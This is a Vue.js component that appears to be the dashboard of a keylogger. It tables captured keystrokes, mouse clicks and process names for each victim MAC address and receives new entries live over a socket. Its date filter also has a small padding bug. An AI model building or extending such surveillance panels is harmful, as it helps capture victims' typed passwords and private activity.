<template>
  <div class="logs">
    <hero title="Logs" subtitle="All logs of clients"></hero>
    <b-table :data="logs" paginated :per-page="50">
      <template scope="props">
        <b-table-column label="Client">
          <figure class="image is-32x32 is-pulled-left">
            <v-gravatar :hash="props.row.client_mac" :size="32" default-img="identicon"></v-gravatar>
          </figure>
          <div class="control">
            <router-link :to="{name: 'client.view', params: {mac: props.row.client_mac}}">
              <div class="tags has-addons">
                <span class="tag is-dark">MAC</span>
                <span class="tag is-info">{{ props.row.client_mac }}</span>
              </div>
            </router-link>
          </div>
        </b-table-column>

        <b-table-column field="timestamp" label="Date" date sortable>
          {{ props.row.timestamp | timestampToDate }}
        </b-table-column>

        <b-table-column label="Process">
          {{ props.row.process }}
        </b-table-column>

        <b-table-column label="Data">
            <span v-if="props.row.type === 'KEYSTROKE'">
              {{ props.row.data }}
            </span>
          <span v-else>
              <b-tooltip :label="`X: ${props.row.data.x}, Y: ${props.row.data.y}`" position="is-top">
                {{ props.row.data.click }}
              </b-tooltip>
            </span>
        </b-table-column>

        <b-table-column label="Type">
          {{ props.row.type }}
        </b-table-column>
      </template>
    </b-table>
  </div>
</template>

<script>
  import Gravatar from 'vue-gravatar'
  import Hero from '@/components/Hero'
  import api from '@/api/index'

  export default {
    name: 'Logs',
    components: {
      'v-gravatar': Gravatar, Hero
    },
    data () {
      return {
        logs: []
      }
    },
    created () {
      api.logs.getAll().then(response => {
        this.logs = response.data.data
      })
    },
    sockets: {
      newLog (data) {
        this.logs.push(data)
      }
    },
    filters: {
      timestampToDate (value) {
        let date = new Date(parseInt(value))
        let dd = (date.getDate() < 9 ? '0' : '') + date.getDate()
        let mm = ((date.getMonth() + 1) < 9 ? '0' : '') + (date.getMonth() + 1)
        let yy = date.getFullYear()
        let h = (date.getHours() < 9 ? '0' : '') + date.getHours()
        let m = (date.getMinutes() < 9 ? '0' : '') + date.getMinutes()
        let s = (date.getSeconds() < 9 ? '0' : '') + date.getSeconds()
        return `${dd}/${mm}/${yy} ${h}:${m}:${s}`
      }
    }
  }
</script>

<style scoped>
  .image {
    margin-right: 10px;
  }
</style>
